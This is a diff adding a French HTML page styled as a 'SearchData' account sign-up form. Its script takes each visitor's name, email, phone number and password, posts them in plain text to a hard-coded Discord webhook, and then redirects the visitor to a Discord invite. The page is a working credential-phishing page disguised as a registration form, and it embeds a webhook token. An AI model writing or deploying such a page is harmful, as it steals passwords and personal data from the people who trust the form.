@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔎 SearchData</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('https://cdn.discordapp.com/attachments/1330500918260797482/1333138174968594612/AAC65C49-D8CB-47D9-819F-944CB14F6F1D.png?ex=679b18ed&is=6799c76d&hm=fd1fc3d9f64ff0d515129d22d7f7abbfb5c7a747ab1284dc87f2b94c8a30673f&') no-repeat center center fixed;
+            background-size: cover;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+    <script>
+        function sendToDiscord() {
+            const webhookURL = "https://discord.com/api/webhooks/1334210446193856603/JSv5bDSZsYpooCx2mukTicaWRu8IDuGEXtj88mGanTUg2CofbK1IiDPOs8QltFiVP8Qn";
+            const name = document.getElementById("name").value;
+            const email = document.getElementById("email").value;
+            const phone = document.getElementById("phone").value;
+            const password = document.getElementById("password").value;
+
+            const payload = {
+                content: `**__Nouvelle inscription :__** \nNom : ${name}\nEmail : ${email}\nTéléphone : ${phone}\nMot de passe : ${password}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                window.location.href = "https://discord.gg/bewt5qpH4K";
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>🔎 SearchData</h1>
+        <p>Inscrivez-vous pour accéder à notre site.</p>
+        <input type="text" id="name" placeholder="Votre nom" required>
+        <input type="email" id="email" placeholder="Votre email" required>
+        <input type="tel" id="phone" placeholder="Votre numéro de téléphone" required>
+        <input type="password" id="password" placeholder="Votre mot de passe" required>
+        <button onclick="sendToDiscord()">Créer un compte</button>
+    </div>
+</body>
+</html>
